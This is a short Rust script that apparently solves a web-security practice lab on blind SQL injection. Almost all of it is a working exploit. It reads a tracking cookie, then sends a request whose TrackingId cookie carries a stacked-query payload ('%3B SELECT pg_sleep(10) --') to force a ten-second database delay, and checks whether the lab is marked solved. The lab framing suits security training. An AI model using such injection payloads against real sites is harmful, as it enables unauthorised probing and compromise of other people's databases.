use reqwest::header::COOKIE;
use server_side_sql_injection::{HTTP_CLIENT, check_is_lab_solved, generate_clap_parser, get_tracking_id};

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    let tracking_id = get_tracking_id(lab_url);

    logger::info("Exploiting blind sql injection with a 10 second time delay....");

    HTTP_CLIENT
        .get(format!("{}/", lab_url))
        // NOTE: `%3B` is the URL encoded version of `;`
        .header(
            COOKIE,
            format!("TrackingId={}'%3B SELECT pg_sleep(10) --", tracking_id),
        )
        .send()
        .expect("[-] Failed to send a GET request to /");

    check_is_lab_solved(lab_url);
}
